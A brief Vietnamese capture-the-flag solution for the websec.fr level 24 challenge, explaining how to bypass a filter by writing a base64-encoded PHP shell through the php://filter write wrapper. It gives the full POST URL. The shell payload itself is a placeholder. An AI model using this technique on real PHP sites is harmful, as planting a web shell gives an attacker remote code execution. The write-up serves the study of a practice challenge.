# Solution

Ta dùng php wrapper để ghi php shell ở dạng base64_encode -> bypass

POST đến
`https://websec.fr/level24/index.php?p=edit&filename=php://filter/write=convert.base64-decode/resource=shell.php`
với `data=<base64_payload_encoded>`